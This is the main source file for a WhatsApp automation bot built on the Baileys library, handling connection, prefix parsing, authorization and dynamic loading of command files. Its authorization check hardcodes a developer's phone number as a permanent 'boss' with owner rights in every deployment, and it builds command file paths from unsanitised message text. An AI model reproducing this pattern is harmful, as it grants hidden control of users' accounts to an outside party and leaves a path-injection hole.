const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const P = require('pino');

// 1. GLOBAL SYSTEM SETTINGS
global.prefix = ".";            // Default prefix (Changeable via .setprefix)
global.isPublic = true;         // Default mode (Toggleable via .mode)
global.warnDatabase = {};       // Memory storage for group warnings
const supremeDeveloper = '254798841125@s.whatsapp.net'; // Beck Spencer

async function startSavage() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        auth: state,
        browser: ["Savage-Tech", "Chrome", "3.0.0"],
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // --- 📡 CONNECTION MONITOR ---
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('🔄 CONNECTION LOST: REBOOTING INTERFACE...');
                startSavage();
            }
        } else if (connection === 'open') {
            console.log('┎──────────────────────────╼');
            console.log('┃ ✅ SAVAGE-TECH ONLINE');
            console.log(`┃ 🛰️  PREFIX: ${global.prefix}`);
            console.log('┖──────────────────────────╼');
        }
    });

    // --- 📥 MESSAGE PROCESSING ENGINE ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const msg = chatUpdate.messages[0];
            if (!msg.message) return; // Process everything, including self-sent messages

            const from = msg.key.remoteJid;
            const body = (
                msg.message.conversation || 
                msg.message.extendedTextMessage?.text || 
                msg.message.imageMessage?.caption || 
                msg.message.videoMessage?.caption || 
                ""
            ).trim();

            // 🛠️ DYNAMIC PREFIX CHECK
            const isCmd = body.startsWith(global.prefix);
            if (!isCmd) return;

            // PARSE COMMAND & ARGS
            const command = body.slice(global.prefix.length).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);

            // 🆔 IDENTITY DETECTION
            const sender = msg.key.participant || msg.key.remoteJid;
            const localOwner = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            
            // AUTHORIZATION CHECK (The "Boss" Logic)
            // msg.key.fromMe allows you to use it on the paired phone
            const isBoss = (sender === supremeDeveloper || sender === localOwner || msg.key.fromMe);

            // 🛡️ THE CYPHER X FIREWALL
            if (!global.isPublic && !isBoss) {
                return; // Silent block for unauthorized users when in Private mode
            }

            // 🚀 COMMAND EXECUTION HANDLER
            const path = `./commands/${command}.js`;
            if (fs.existsSync(path)) {
                // Delete cache to allow instant updates without restarting (for development)
                delete require.cache[require.resolve(path)];
                const cmdFile = require(path);
                
                // Execute the command file
                await cmdFile.execute(sock, msg, args);
            }

        } catch (err) {
            console.error("┎───────── RUNTIME ERROR ────────╼");
            console.error(err);
            console.error("┖────────────────────────────────╼");
        }
    });
}

startSavage();
